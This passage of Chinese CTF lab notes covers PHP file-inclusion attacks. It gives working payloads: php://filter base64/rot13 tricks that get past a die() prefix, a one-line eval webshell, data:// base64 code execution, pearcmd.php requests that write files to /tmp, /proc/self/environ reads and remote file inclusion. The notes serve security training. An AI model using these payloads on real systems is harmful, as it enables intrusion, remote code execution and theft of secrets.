+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">**<span class="meta">&lt;?php</span>**<span class="comment">// 数组数据（会自动拼接成 &quot;姓名：张三 年龄：25 爱好：打球&quot;）</span></span><br><span class="line"><span class="variable">$userInfo</span> = [<span class="string">&quot;姓名：张三 &quot;</span>,<span class="string">&quot;年龄：25 &quot;</span>,<span class="string">&quot;爱好：打球&quot;</span>];<span class="comment">// 写入文件</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./user.txt&#x27;</span>, <span class="variable">$userInfo</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>执行后，<code>user.txt</code> 内容：<code>姓名：张三 年龄：25 爱好：打球</code></li>
+</ul>
+<p><code>str_replace()</code> 是 PHP 中最常用的 <strong>字符串替换函数</strong>—— 核心作用是：<strong>在一个字符串里，把指定的 “目标内容” 换成 “新内容”</strong>，支持单个替换、批量替换，用法简单且实用。</p>
+<p>一句话概括：<strong>“查找字符串里的‘旧东西’，全部换成‘新东西’”</strong>。</p>
+<h5 id="str-replace-函数介绍"><a href="#str-replace-函数介绍" class="headerlink" title="*str_replace() 函数介绍"></a><code>*str_replace()</code> 函数介绍</h5><p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 单个替换：把 $str 里的 $search 全换成 $replace</span></span><br><span class="line"><span class="title function_ invoke__">str_replace</span>(要查找的旧内容, 要替换的新内容, 原始字符串);</span><br><span class="line"><span class="comment">// 2. 批量替换：多个旧内容对应多个新内容（数组形式）</span></span><br><span class="line"><span class="title function_ invoke__">str_replace</span>(数组[旧内容<span class="number">1</span>, 旧内容<span class="number">2</span>], 数组[新内容<span class="number">1</span>, 新内容<span class="number">2</span>], 原始字符串);</span><br><span class="line"><span class="comment">// 3. 带计数：最后加一个变量，接收“替换了多少次”（可选）</span></span><br><span class="line"><span class="title function_ invoke__">str_replace</span>(旧内容, 新内容, 原始字符串, $替换次数);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>返回值：替换后的<strong>新字符串</strong>（不会修改原始字符串，原始字符串保持不变）；</li>
+<li>特点：<strong>区分大小写</strong>（比如替换 “php” 不会影响 “PHP”）、<strong>全局替换</strong>（找到的所有匹配内容都会被换）。</li>
+</ul>
+<h4 id="rot13-【绕过-die】"><a href="#rot13-【绕过-die】" class="headerlink" title="rot13 【绕过 die】"></a><strong>rot13 【绕过 die】</strong></h4><p><strong>(绕过 file_put_contents 已给 die 函数的限制)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $content = $_POST[&#x27;content&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content);    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>一个写文件的题，但是有过滤，不允许包含 <code>php</code> , <code>data</code> , <code>:</code> 和 <code>.</code> 但是在写入操作的时候，**HTTP 请求会自动做一次 URL 解码，**会把 <code>file</code> 参数进行 <code>urldecode</code>，所以我们可以两次 <code>urldecode</code> 来绕过过滤，然后只需要考虑如何绕过 <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code> 中的 <code>die()</code> 即可</p>
+<p>我们可以尝试使用 Base64 绕过 <code>die()</code>，Base64 的编码范围是 <code>0-9</code> , <code>a-z</code> , <code>A-Z</code> , <code>+</code> 和 <code>/</code> ，其他字符会被忽略，去掉不支持的字符，只剩下了 <code>phpdie</code> 了，因为 Base64 解码是按照 4 位 一组进行解码的，所以我们需要在最终编码出来的字符串中最前面添加两个字母，以达到 Base64 解码的规则</p>
+<p>注意:file_put_contents 可以新建一个名为 1.php 的文件并写入代码.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 需要两次URL编码</span><br><span class="line">GET: ?file=php://filter/convert.base64-decode/resource=1.php// </span><br><span class="line">需要base64编码，编码后最前面添加两个字母如：aa</span><br><span class="line">POST: content=&lt;?php system(&#x27;cat f*&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><u>豆包对这道题有更通俗的解读</u></p>
+<p><a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/NG8PwBXh8isgJck3YDdcYk38nAg">rot13 解法一解释</a></p>
+<p>另一种方法是使用 Rot13 编码(和 base64 绕过 die 的原理是相同的)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// 需要两次URL编码GET: ?file=php://filter/string.rot13/resource=1.php// 需要Rot13编码POST: content=&lt;?php system(&#x27;cat f*&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>Rot13 解码后写入的文件内容变为了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?cuc qvr(&#x27;大佬别秀了&#x27;);?&gt;&lt;?php system(&#x27;cat f*&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以绕过 <code>die()</code> 了</p>
+<h4 id="input"><a href="#input" class="headerlink" title="input"></a><strong>input</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 注意使用 php://input 的时候必须开启 allow_url_include</span><br><span class="line">&lt;?php</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">  include($_GET[&#x27;filename&#x27;]);</span><br><span class="line">  ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Bi6QbpsWLo3qzuxayr2cFa8Pnde.jpeg"></p>
+<p>当我们有写入操作的时候，可以直接写入一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&#x27;muma.php&#x27;, &#x27;&lt;?php @eval($_POST[cmd]);&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p><code>data://</code> 是 PHP 里的一种 “数据流协议”，核心作用是：<strong>直接把 “数据本身” 当成 “文件” 来用</strong>—— 不用真的创建一个物理文件（比如 1.php），而是把代码 &#x2F; 文本 “伪装成文件内容”，让 PHP 的 <code>include()</code>&#x2F;<code>require()</code> 函数执行它。</p>
+<p>简单说：<code>data://</code> &#x3D; “无文件执行 PHP 代码” 的工具，前提是必须开 <code>allow_url_fopen=on</code> 和 <code>allow_url_include=on</code>（两个开关都要开，默认可能关，所以是漏洞常用场景）。</p>
+<h4 id="一、为什么需要-data-？（生活类比）"><a href="#一、为什么需要-data-？（生活类比）" class="headerlink" title="*一、为什么需要 data:&#x2F;&#x2F;？（生活类比）*"></a>*<em>一、为什么需要 <strong><strong>data:&#x2F;&#x2F;</strong></strong>？（生活类比）</em>*</h4><p>你想让 PHP 执行一段代码，但服务器不让你上传文件（比如禁止传.php 文件），怎么办？<code>data://</code> 就像 “隐形文件”：你不用真的存文件到服务器，而是直接把代码 “嵌在 URL &#x2F; 参数里”，告诉 PHP：“把这段数据当成一个文件来执行”。</p>
+<p>比如：正常执行代码需要 <code>include(&#39;1.php&#39;)</code>（1.php 里是 <code>phpinfo();</code>）；用 <code>data://</code> 可以直接 <code>include(&#39;data://text/plain,&lt;?php phpinfo();?&gt;&#39;)</code>—— 没有 1.php 文件，但效果一样。</p>
+<h4 id="二、两种用法（通俗解释-示例）"><a href="#二、两种用法（通俗解释-示例）" class="headerlink" title="二、两种用法（通俗解释 + 示例）"></a><strong>二、两种用法（通俗解释 + 示例）</strong></h4><p><code>data://</code> 有两种常用格式，核心区别是 “数据是否 Base64 编码”，咱们逐个说：</p>
+<h5 id="用法-1：明文格式（data-text-plain-代码）"><a href="#用法-1：明文格式（data-text-plain-代码）" class="headerlink" title="用法 1：明文格式（data:&#x2F;&#x2F;text&#x2F;plain,代码）"></a><strong>用法 1：明文格式（<strong><strong>data:&#x2F;&#x2F;text&#x2F;plain,代码</strong></strong>）</strong></h5><ul>
+<li>格式：<code>data://text/plain,要执行的PHP代码</code></li>
+<li>通俗说：“告诉 PHP，后面的内容是纯文本格式，直接执行里面的 PHP 代码”</li>
+<li>示例：</li>
+<li>php</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">**<span class="meta">&lt;?php</span>**<span class="comment">// 开启两个必要开关（实际环境需要在php.ini里设置，这里是模拟）</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;allow_url_fopen&#x27;</span>, <span class="string">&#x27;on&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;allow_url_include&#x27;</span>, <span class="string">&#x27;on&#x27;</span>);<span class="comment">// 用include执行data://里的代码</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;data://text/plain,&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>执行结果：会输出 PHP 的环境信息（<code>phpinfo()</code> 的效果），相当于执行了一段 PHP 代码，却没创建任何文件。</li>
+</ul>
+<h5 id="用法-2：Base64-编码格式（推荐）（data-text-plain-base64-编码后的代码）"><a href="#用法-2：Base64-编码格式（推荐）（data-text-plain-base64-编码后的代码）" class="headerlink" title="用法 2：Base64 编码格式（推荐）（data:&#x2F;&#x2F;text&#x2F;plain;base64,编码后的代码）"></a><strong>用法 2：Base64 编码格式（推荐）（<strong><strong>data:&#x2F;&#x2F;text&#x2F;plain;base64,编码后的代码</strong></strong>）</strong></h5><ul>
+<li><p>格式：<code>data://text/plain;base64,Base64编码后的PHP代码</code></p>
+</li>
+<li><p>通俗说：“先把 PHP 代码用 Base64 编码（变成一串字母数字），再告诉 PHP：先解码这段数据，再执行里面的代码”</p>
+</li>
+<li><p>示例：</p>
+<ol>
+<li>先把要执行的代码 <code>&lt;?php phpinfo();?&gt;</code> 做 Base64 编码（在线编码工具就能弄），编码结果是：<code>PD9waHAgcGhwaW5mbygpOz8+</code></li>
+<li>用 <code>data://</code> 执行编码后的内容：</li>
+<li>php</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  ```</span><br><span class="line"></span><br><span class="line">**<span class="meta">&lt;?php</span>**<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;allow_url_fopen&#x27;</span>, <span class="string">&#x27;on&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;allow_url_include&#x27;</span>, <span class="string">&#x27;on&#x27;</span>);<span class="comment">// 解码后执行：PD9waHAgcGhwaW5mbygpOz8+ → &lt;?php phpinfo();?&gt;include(&#x27;data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+&#x27;);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>执行结果：和明文格式一样，输出 <code>phpinfo()</code> 信息。</p>
+</li>
+</ul>
+<h4 id="三、为什么推荐用-Base64-编码？（关键！）"><a href="#三、为什么推荐用-Base64-编码？（关键！）" class="headerlink" title="三、为什么推荐用 Base64 编码？（关键！）"></a><strong>三、为什么推荐用 Base64 编码？（关键！）</strong></h4><p>这是你最关心的点 —— 明文格式明明更简单，为啥非要 Base64 编码？核心原因是 <strong>“绕过过滤”</strong>，咱们结合漏洞题场景说：</p>
+<h5 id="绕过-“特殊字符过滤”"><a href="#绕过-“特殊字符过滤”" class="headerlink" title="绕过 “特殊字符过滤”"></a>绕过 “特殊字符过滤”</h5><p>很多漏洞题会过滤 <code>&lt;?php</code>、<code>&gt;</code>、<code>;</code> 这些 PHP 代码特有的字符（比如过滤 <code>&lt;?</code> 变成空），此时明文格式会失效：</p>
+<ul>
+<li><p>比如题目过滤 <code>&lt;?</code>：明文 <code>data://text/plain,&lt;?php phpinfo();?&gt;</code> 会变成 <code>data://text/plain,php phpinfo();?&gt;</code>，执行失败；</p>
+</li>
+<li><p>但 Base64 编码后，代码变成 <code>PD9waHAgcGhwaW5mbygpOz8+</code>（全是字母数字，没有特殊字符），过滤函数找不到要替换的内容，直接放行 —— 解码后又能还原成原始代码，成功执行。</p>
+</li>
+</ul>
+<h5 id="避免-“语法冲突”"><a href="#避免-“语法冲突”" class="headerlink" title="避免 “语法冲突”"></a>避免 “语法冲突”</h5><p>如果 <code>data://</code> 后面的代码包含逗号、空格、&amp; 等 URL 特殊字符，可能会被浏览器 &#x2F; 服务器解析错误（比如逗号会被当成参数分隔符）；Base64 编码后会把这些特殊字符转成安全的字母数字，避免冲突。</p>
+<h5 id="漏洞题的-“常规操作”"><a href="#漏洞题的-“常规操作”" class="headerlink" title="漏洞题的 “常规操作”"></a>漏洞题的 “常规操作”</h5><p>漏洞题中，<code>data://</code> 几乎都是和 “文件包含漏洞” 结合的 —— 黑客想执行恶意代码，但服务器过滤了特殊字符，所以用 Base64 编码绕过，这是最稳妥、最常用的手段。</p>
+<h4 id="四、实操示例：用-data-执行恶意代码（漏洞场景）"><a href="#四、实操示例：用-data-执行恶意代码（漏洞场景）" class="headerlink" title="四、实操示例：用 data:&#x2F;&#x2F; 执行恶意代码（漏洞场景）"></a><strong>四、实操示例：用 <strong><strong>data:&#x2F;&#x2F;</strong></strong> 执行恶意代码（漏洞场景）</strong></h4><p>假设题目有一个文件包含漏洞，代码如下（接收 <code>file</code> 参数，包含对应的文件）：</p>
+<p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**<span class="meta">&lt;?php</span>**<span class="comment">// 题目开启了 allow_url_fopen 和 allow_url_include（漏洞前提）$file = $_GET[&#x27;file&#x27;];include($file); // 直接包含用户传入的file参数，存在漏洞?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>*<em>我们要执行 <strong><strong>system(‘cat flag.php’)</strong></strong>（读取 flag 文件），步骤如下：</em>*</p>
+<ol>
+<li>把恶意代码 <code>&lt;?php system(&#39;cat flag.php&#39;);?&gt;</code> 做 Base64 编码，得到：<code>PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</code></li>
+<li>构造 <code>data://</code> 格式的 Payload，作为 <code>file</code> 参数传入：</li>
+<li>plaintext</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://目标服务器/漏洞文件.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>服务器执行流程：<ul>
+<li>接收 <code>file</code> 参数：<code>data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</code></li>
+<li><code>include()</code> 函数识别 <code>data://</code> 协议，按照规则解码 Base64 字符串；</li>
+<li>解码后得到 <code>&lt;?php system(&#39;cat flag.php&#39;);?&gt;</code>，并执行；</li>
+<li>最终输出 <code>flag.php</code> 的内容，我们拿到 flag。</li>
+</ul>
+</li>
+</ol>
+<h4 id="五、关键补充（避坑-安全）"><a href="#五、关键补充（避坑-安全）" class="headerlink" title="五、关键补充（避坑 + 安全）"></a>五、关键补充（避坑 + 安全）</h4><ol>
+<li><p><strong>必须开启两个开关</strong>：<code>allow_url_fopen=on</code> 和 <code>allow_url_include=on</code>—— 少一个都用不了（生产环境建议都设为 <code>off</code>，防止被黑客利用）；</p>
+</li>
+<li><p><strong>Base64 编码注意事项</strong>：</p>
+<ul>
+<li>编码的代码必须是 PHP 格式（比如开头 <code>&lt;?php</code>，结尾 <code>?&gt;</code>，或省略 <code>?&gt;</code>）；</li>
+<li>编码时不要带多余空格 &#x2F; 换行，否则解码后会出错；</li>
+<li>在线编码工具选 “UTF-8 无 BOM”，避免乱码。</li>
+</ul>
+</li>
+<li><p><strong>和 <strong><strong>php:&#x2F;&#x2F;</strong></strong> 的区别</strong>：</p>
+<ul>
+<li><code>php://</code> 是 “访问 PHP 内置的输入输出流”（比如读 POST 原始数据）；</li>
+<li><code>data://</code> 是 “把数据伪装成文件”（比如执行代码）；</li>
+</ul>
+</li>
+<li><p><strong>安全风险</strong>：如果服务器开了两个开关，又有文件包含漏洞，黑客可以用 <code>data://</code> 执行任意 PHP 代码，控制服务器 —— 所以生产环境一定要禁用这两个开关（或严格过滤用户输入）。</p>
+</li>
+</ol>
+<h4 id="总结（一句话记死）"><a href="#总结（一句话记死）" class="headerlink" title="总结（一句话记死）"></a>总结（一句话记死）</h4><p><code>data://</code> 是 “无文件执行 PHP 代码” 的工具，需要两个开关开启；推荐用 Base64 编码是为了绕过特殊字符过滤，核心用在文件包含漏洞场景，让黑客不用上传文件就能执行恶意代码。</p>
+<p>这段内容讲的是 <strong>PHP 文件包含漏洞的 3 种高级绕过（bypass）技巧</strong>，核心场景是 “服务器不让直接执行恶意代码 &#x2F; 写文件，用这些方法绕开限制拿权限（getshell）”。咱们用 “大白话 + 场景拆解”，从 “是什么 → 怎么用 → 为什么有用” 讲透，完全不用怕看不懂：</p>
+<h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><h4 id="先铺垫核心背景：什么是-“文件包含漏洞”？"><a href="#先铺垫核心背景：什么是-“文件包含漏洞”？" class="headerlink" title="先铺垫核心背景：什么是 “文件包含漏洞”？"></a>先铺垫核心背景：什么是 “文件包含漏洞”？</h4><p>简单说：如果 PHP 代码里有 <code>include($_GET[&#39;file&#39;])</code> 这种写法（直接包含用户传入的参数），黑客就能通过 <code>?file=恶意文件</code> 让服务器执行恶意代码 —— 这就是 “文件包含漏洞”。</p>
+<p>但服务器通常会有防护（比如过滤 <code>php://</code>、<code>data://</code> 这些协议），所以下面 3 个技巧，都是 “防护绕过方案”，而且主要针对 <strong>Docker 环境的 PHP</strong>（因为 Docker 有一些默认特性可被利用）。</p>
+<h4 id="一、pearcmd-php-利用：Docker-默认自带的-“写文件工具”"><a href="#一、pearcmd-php-利用：Docker-默认自带的-“写文件工具”" class="headerlink" title="一、pearcmd.php 利用：Docker 默认自带的 “写文件工具”"></a>一、pearcmd.php 利用：Docker 默认自带的 “写文件工具”</h4><p><strong>核心原理（一句话）</strong></p>
+<p>Docker 里的 PHP 默认装了一个叫 <code>pearcmd.php</code> 的工具文件（路径固定：<code>/usr/local/lib/php/pearcmd.php</code>），这个文件有个隐藏功能：<strong>能接收参数，帮我们在服务器上写任意文件</strong>—— 不用自己上传，直接通过漏洞触发它写恶意 PHP 文件，再包含执行。</p>
+<p><strong>为什么能用上？</strong></p>
+<ul>
+<li>Docker 特性：所有 Docker 的 PHP 镜像，默认都带了 <code>pearcmd.php</code>（相当于 “自带的后门工具”，不是漏洞，是正常工具被滥用）；</li>
+<li>无需复杂操作：不用绕太多过滤，一个请求就能写文件，成功率高。</li>
+</ul>
+<p><strong>实操拆解（看那个数据包）</strong></p>
+<p>黑客发送的请求：</p>
+<p>plaintext</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>咱们翻译一下这个请求的意思：</p>
+<ul>
+<li><p>目标：服务器上有漏洞的文件 <code>index.php</code>（里面有 <code>include($_GET[&#39;file&#39;])</code>）；</p>
+</li>
+<li><p>核心操作：让 <code>index.php</code> 包含 <code>pearcmd.php</code>（通过 <code>&amp;file=/usr/local/lib/php/pearcmd.php</code>）；</p>
+</li>
+<li><p>关键参数：<code>+config-create+/</code> 是 <code>pearcmd.php</code> 的 “写文件命令”，后面跟着 3 个核心信息：</p>
+<ol>
+<li>要写的内容：<code>&lt;?=phpinfo()?&gt;</code>（恶意代码，执行后显示 PHP 信息）；</li>
+<li>保存路径：<code>/tmp/hello.php</code>（服务器上的临时目录，Docker 里 <code>/tmp</code> 通常可写）；</li>
+</ol>
+</li>
+</ul>
+<p><strong>执行流程</strong></p>
+<ol>
+<li>黑客发上面的请求 → 服务器执行 <code>index.php</code>→ 包含 <code>pearcmd.php</code>；</li>
+<li><code>pearcmd.php</code> 接收 <code>config-create</code> 命令，按照要求写文件：把 <code>&lt;?=phpinfo()?&gt;</code> 写入 <code>/tmp/hello.php</code>；</li>
+<li>黑客再发一个请求：<code>/index.php?file=/tmp/hello.php</code>→ 服务器包含这个恶意文件，执行 <code>phpinfo()</code>，成功 getshell。</li>
+</ol>
+<p><strong>通俗类比</strong></p>
+<p>相当于 Docker 的 PHP 服务器里，默认放了一把 “万能写文件的钥匙”（<code>pearcmd.php</code>），黑客通过漏洞拿到这把钥匙，让它帮自己写了一把 “后门钥匙”（<code>hello.php</code>），之后就能用后门钥匙随便操作服务器了。</p>
+<h4 id="二、peclcmd-利用：和-pearcmd-类似的-“兄弟工具”"><a href="#二、peclcmd-利用：和-pearcmd-类似的-“兄弟工具”" class="headerlink" title="二、peclcmd 利用：和 pearcmd 类似的 “兄弟工具”"></a>二、peclcmd 利用：和 pearcmd 类似的 “兄弟工具”</h4><p><strong>核心原理</strong></p>
+<p>和 <code>pearcmd.php</code> 几乎一样！是 Docker PHP 里默认带的另一个工具文件（<code>peclcmd.php</code>），也有 “接收参数写文件” 的功能。</p>
+<p><strong>区别</strong></p>
+<ul>
+<li>适用场景：部分 Docker 镜像可能 <code>pearcmd.php</code> 被删，但 <code>peclcmd.php</code> 还在，相当于 “备用方案”；</li>
+<li>用法：和 pearcmd 类似，只是命令参数、文件路径可能略有不同（比如命令不是 <code>config-create</code>，但核心是 “用工具写文件”）；</li>
+<li>来源：题目里提到的 SEETF-2023 是 CTF 比赛题，本质就是用这个工具绕开了服务器的过滤。</li>
+</ul>
+<p><u>总结：pearcmd 和 peclcmd 就是 “Docker PHP 自带的两把写文件钥匙”，任选其一能用就好。</u></p>
+<h4 id="三、-proc-目录利用：Linux-系统的-“进程信息宝库”（非预期绕过）"><a href="#三、-proc-目录利用：Linux-系统的-“进程信息宝库”（非预期绕过）" class="headerlink" title="三、&#x2F;proc 目录利用：Linux 系统的 “进程信息宝库”（非预期绕过）"></a>三、&#x2F;proc 目录利用：Linux 系统的 “进程信息宝库”（非预期绕过）</h4><p><strong>核心原理（一句话）</strong></p>
+<p><code>/proc</code> 是 Linux 系统的 “虚拟文件系统”（数据存在内存里，不是硬盘），里面存着所有进程的秘密（比如进程执行的命令、打开的文件、环境变量）。如果服务器没过滤 <code>/proc</code>，黑客能通过它读取关键信息，绕开限制拿到恶意代码。</p>
+<p><strong>为什么能用上？</strong></p>
+<ul>
+<li>无文件依赖：不用写文件、不用找工具，直接读系统自带的 “进程信息文件”；</li>
+<li>非预期：很多出题人 &#x2F; 开发者会忽略 <code>/proc</code> 的风险，没过滤它，属于 “防不胜防” 的绕过。</li>
+</ul>
+<p><strong>重点理解几个关键的 &#x2F;proc 文件（黑客常用）</strong></p>
+<p>先记住：<code>/proc/self/</code> 代表 “当前正在运行的进程”（也就是执行 PHP 脚本的进程），不用记复杂的进程号（PID），用 <code>self</code> 就行：</p>
+<p><strong>实操场景（比如 CTF 题目里的用法）</strong></p>
+<p>假设服务器过滤了 <code>php://</code>、<code>data://</code>，但没过滤 <code>/proc</code>，黑客可以：</p>
+<ol>
+<li>用 <code>/proc/self/cwd/flag.php</code> 直接包含网站根目录的 flag 文件（因为 <code>cwd</code> 指向网站目录）；</li>
+<li>用 <code>/proc/self/fd/3</code> 读取服务器正在打开的某个敏感文件（比如 fd&#x2F;3 是配置文件，里面有后门）；</li>
+<li>用 <code>/proc/self/environ</code> 读取环境变量里的 <code>FLAG</code> 字段（很多 CTF 题会把 flag 存在环境变量里）。</li>
+</ol>
+<p><strong>通俗类比</strong></p>
+<p><code>/proc</code> 就像服务器的 “身份证 + 钥匙串”，里面记着自己的运行方式、藏东西的地方、甚至密码。黑客通过漏洞拿到这个 “身份证”，就能找到服务器的秘密，绕开防护直接拿权限。</p>
+<h4 id="三个技巧的核心区别-适用场景"><a href="#三个技巧的核心区别-适用场景" class="headerlink" title="三个技巧的核心区别 &amp; 适用场景"></a>三个技巧的核心区别 &amp; 适用场景</h4><h4 id="总结（一句话记死）-1"><a href="#总结（一句话记死）-1" class="headerlink" title="总结（一句话记死）"></a>总结（一句话记死）</h4><p>这三个都是文件包含漏洞的 “高级绕法”：前两个靠 Docker PHP 自带的 “写文件工具” 偷偷写后门，后一个靠 Linux 的 “进程信息文件” 直接找秘密 —— 核心都是 “绕开服务器防护，不用正常上传 &#x2F; 执行，就能拿到权限”。</p>
+<p>如果是 CTF 做题 &#x2F; 漏洞挖掘，优先试 pearcmd（成功率最高），不行再试 peclcmd，最后试 &#x2F;proc（看运气碰非预期）</p>
+<h1 id="Week3-5-实验-PHP-文件包含-lab0-11-解题-补充知识"><a href="#Week3-5-实验-PHP-文件包含-lab0-11-解题-补充知识" class="headerlink" title="*[Week3.5]实验:PHP 文件包含 lab0-11 解题 补充知识"></a>*[Week3.5]实验:PHP 文件包含 lab0-11 解题 补充知识</h1><h3 id="RCE-括号绕过"><a href="#RCE-括号绕过" class="headerlink" title="RCE 括号绕过"></a>RCE 括号绕过</h3><p>若括号被过滤,可以使用反引号 &#96;&#96; 进行命令执行,但这个函数只有返回值,不会输出 要用 echo <code>指令</code> 来输出结果</p>
+<h3 id="十六进制编码避免过滤-用于绕过命令中被过滤的字符"><a href="#十六进制编码避免过滤-用于绕过命令中被过滤的字符" class="headerlink" title="十六进制编码避免过滤(用于绕过命令中被过滤的字符)"></a>十六进制编码避免过滤(用于绕过命令中被过滤的字符)</h3><p>PHP 只有在解析 字符串字面量（用单引号 ‘、双引号 “、反引号 &#96; 包裹的内容）时，才会识别 \x 转义符。</p>
+<p>这时候才可以用十六进制编码避免过滤.例如<?php echo ``\x6d\x6f\x72\x65\x20\x2f\x66\x6c\x61\x67``?> 注意里面有反引号</p>
+<h3 id="远程文件包含-http-https-解题办法"><a href="#远程文件包含-http-https-解题办法" class="headerlink" title="远程文件包含(http&#x2F;https 解题办法)"></a><strong>远程文件包含(http&#x2F;https 解题办法)</strong></h3><p>题目:</p>
+<?php
+
+isset($_GET['wrappers']) ? include("http://".$_GET['wrappers']) : '';
+
+
+
+highlight_file(__FILE__);
+
+
+
+?>
+
+<p>flag 在&#x2F;flag 里面</p>
+<p><strong>本地搭临时服务器（最快，推荐）</strong></p>
+<p>适合自己有电脑的情况，不用依赖外部服务器，3 步搞定：</p>
+<p><strong>步骤 1：写一个 “读 flag 的 PHP 文件”</strong></p>
+<p>新建一个文本文件，命名为 <code>flag.php</code>（名字随便取），内容写：</p>
+<p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**<span class="meta">&lt;?php</span>** <span class="keyword">echo</span> `more /flag`; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>原理：这个文件的作用是执行 <code>more /flag</code> 命令（读根目录 flag），并输出结果；</li>
+</ul>
+<p>备用命令：如果 <code>more</code> 被禁，换成 <code>less /flag</code>、<code>tail /flag</code>，代码改成 <code>&lt;?php echo </code> tail &#x2F;flag <code>; ?</code><strong>&gt;****。</strong></p>
+<p><strong>步骤 2：本地搭临时 HTTP 服务器</strong></p>
+<p>打开电脑的「终端 &#x2F; 命令提示符」，进入 <code>flag.php</code> 所在的文件夹，执行以下命令（PHP 自带临时服务器，不用装 Apache&#x2F;Nginx）：</p>
+<ul>
+<li>Windows&#x2F;Mac&#x2F;Linux 通用命令：</li>
+<li>bash</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 0.0.0.0:8080</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>执行后会提示 <code>PHP 7.4.3 Development Server (``http://0.0.0.0:8080``) started</code>，说明服务器搭好了（端口 8080，可改成 80、8000 等没被占用的端口）。</li>
+</ul>
